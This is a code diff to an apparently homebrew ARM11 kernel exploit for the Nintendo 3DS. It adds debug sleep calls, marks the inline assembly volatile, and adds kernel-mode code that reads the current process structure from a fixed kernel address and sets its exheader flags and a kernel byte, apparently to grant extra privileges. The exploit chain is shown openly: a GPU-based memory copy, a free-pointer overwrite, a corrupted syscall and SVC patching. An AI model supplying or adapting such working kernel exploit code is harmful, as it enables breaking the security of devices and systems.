@@ -17,6 +17,8 @@ unsigned int *arm11_buffer;
 //Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
 
+#define wait() svcSleepThread(1000000000ull)
+
 int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
 	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
@@ -143,6 +145,7 @@ int arm11_kernel_exploit_setup(void)
 	// overwrite free pointer
 #ifdef DEBUG_PROCESS
 	printf("Overwriting free pointer %x\n", mem_hax_mem);
+	wait();
 #endif
 
 	//Trigger write to kernel
@@ -185,20 +188,28 @@ int arm11_kernel_exploit_setup(void)
 int __attribute__((naked))
 arm11_kernel_exploit_exec (int (*func)(void))
 {
-	__asm__ ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
+	asm volatile ("svc 8\t\n" // CreateThread syscall, corrupted, args not needed
 			 "bx lr\t\n");
 }
 
 int __attribute__((naked))
 arm11_kernel_execute(int (*func)(void))
 {
-	__asm__ ("svc #0x7B\t\n"
+	asm volatile ("svc #0x7B\t\n"
 			 "bx lr\t\n");
 }
 
+struct KProcess {
+	/* 00 */ char padding1[0xA8 - 0x0];
+	/* A8 */ u32 exheader_flags;
+	/* AC */ char padding2[0xB4 - 0xAC];
+	/* B4 */ u32 pid;
+};
+
 void test(void)
 {
-	arm11_buffer[0] = 0xFAAFFAAF;
+	struct KProcess* kproc = *((struct KProcess**)0xFFFF9004);
+	arm11_buffer[0] = kproc->pid;
 }
 
 arm11_kernel_exec (void)
@@ -215,6 +226,12 @@ arm11_kernel_exec (void)
 		*(int *)(svc_patch_addr+8) = 0xE320F000; //NOP
 		patched_svc = 1;
 	}
+
+	*((u8*)0xFFF2D00A) |= 1;
+
+	struct KProcess* kproc = *((struct KProcess**)0xFFFF9004);
+	kproc->exheader_flags |= 0x2;
+
 	InvalidateEntireInstructionCache();
 	InvalidateEntireDataCache();
 
@@ -224,11 +241,11 @@ arm11_kernel_exec (void)
 int __attribute__((naked))
 arm11_kernel_stub (void)
 {
-	__asm__ ("add sp, sp, #8\t\n");
+	asm volatile ("add sp, sp, #8\t\n");
 
 	arm11_kernel_exec ();
 
-	__asm__ ("movs r0, #0\t\n"
+	asm volatile ("movs r0, #0\t\n"
 			 "ldr pc, [sp], #4\t\n");
 }
 
@@ -272,6 +289,7 @@ int doARM11Hax()
 	{
 #ifdef DEBUG_PROCESS
 		printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
+		wait();
 #endif
 
 		arm11_kernel_exploit_exec (arm11_kernel_stub);
